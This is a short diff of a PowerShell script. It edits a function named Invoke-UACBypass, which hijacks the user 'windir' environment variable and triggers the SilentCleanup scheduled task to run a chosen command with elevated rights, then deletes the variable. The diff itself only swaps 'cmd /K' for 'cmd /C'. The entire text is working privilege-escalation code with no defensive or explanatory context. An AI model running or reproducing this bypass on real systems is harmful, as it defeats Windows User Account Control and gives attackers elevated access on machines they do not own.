@@ -3,7 +3,7 @@
 Function Invoke-UACBypass {
 param($cmd="powershell.exe")
 
-    Set-ItemProperty -Path HKCU:\Environment -Name windir -Value "cmd /K $cmd && REM" -Force
+    Set-ItemProperty -Path HKCU:\Environment -Name windir -Value "cmd /C $cmd && REM" -Force
     Invoke-Expression "schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
     Start-Sleep -Seconds 10
     Remove-ItemProperty -Path HKCU:\Environment -Name windir -Force
